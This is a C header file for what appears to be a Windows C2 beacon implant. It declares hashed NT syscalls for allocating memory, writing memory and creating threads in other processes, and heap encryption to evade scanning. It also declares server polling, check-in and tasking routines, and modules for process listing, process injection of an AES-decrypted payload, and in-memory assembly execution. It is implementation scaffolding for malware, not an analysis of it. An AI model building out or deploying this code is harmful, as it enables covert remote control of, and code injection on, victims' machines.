#pragma once
#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "hall.h"

//----------------[syscall hashes]------------------------------------------//

#define NtAllocateVirtualMemory_CRC32    0xE0762FEB
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtCreateThreadEx_CRC32           0x2073465A
#define NtOpenProcess_CRC32              0xDBF381B5
#define NtWriteVirtualMemory_CRC32       0xE4879939

//----------------[structs]-------------------------------------------------//

typedef struct _MyStruct {
    SysFunc NtAllocateVirtualMemory;
    SysFunc NtProtectVirtualMemory;
    SysFunc NtCreateThreadEx;
    SysFunc NtOpenProcess;
    SysFunc NtWriteVirtualMemory;
} MyStruct, *PMyStruct;

extern MyStruct S;

typedef struct {
    char* data;
    size_t size;
} MyHttpResponse;

//----------------[globals]-------------------------------------------------//

extern char* g_serverUrl;
extern char* g_beaconId;
extern int g_pollingInterval;
extern int g_maxRetries;

//----------------[core]----------------------------------------------------//

void asyncHandler();
DWORD WINAPI pollingThread(LPVOID lpParam);

//----------------[encryption]----------------------------------------------//

void initializeMemoryEncryption();
void encryptHeap();
void decryptHeap();
void xorEncryptMemory(BYTE* data, SIZE_T size);
void cleanupMemoryEncryption();

//----------------[http]----------------------------------------------------//

MyHttpResponse* makeHttpRequest(const char* url, const char* data, const char* method, const char* headers);
char* buildHttpUrl(const char* baseUrl, const char* endpoint);
void freeHttpResponse(MyHttpResponse* response);
char* urlEncode(const char* str);
char* httpSendToServer(const char* data);

//----------------[base]----------------------------------------------------//

void register_base();
void request_action();
void checkin();
void shutdown_base();

//----------------[modules]-------------------------------------------------//

void execute_module(const char* moduleName, const char* moduleParams);

char* whoami_module(const char* params);
char* pwd_module(const char* params);
char* ls_module(const char* params);
char* ps_module(const char* params);
int inject_module(IN DWORD targetPid, IN const char* encryptedContent);
char* execute_assembly_module(const char* params);

//----------------[utils]---------------------------------------------------//

void* safe_malloc(size_t size);
void* safe_realloc(void* ptr, size_t size);
void safe_free(void* ptr);

BOOL aesDecryptionHelper(IN const char* encryptedContent, OUT PBYTE* pDecryptedData, OUT SIZE_T* sDecryptedData);